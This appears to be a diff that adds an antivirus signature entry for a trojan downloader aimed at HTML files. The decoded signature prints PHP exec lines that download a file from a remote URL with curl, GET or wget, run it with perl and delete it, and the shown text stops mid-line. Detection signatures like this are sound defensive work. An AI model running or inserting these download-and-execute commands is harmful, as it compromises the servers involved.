@@ -1,0 +1,5 @@
+VIRUS NAME: Win.Trojan.Downloader-130
+TARGET TYPE: HTML
+OFFSET: *
+DECODED SIGNATURE:
+exec('cd /tmp;curl -o '.$url.'b.txt;perl b.txt;rm -f b.txt*;'); exec('cd /tmp;get '.$url.'b.txt>b.txt;perl b.txt;rm -f b.txt*;'); exec('cd /tmp;wget '.$url.'b.txt;perl b.txt;rm -f b.txt*;'); exec('cd 
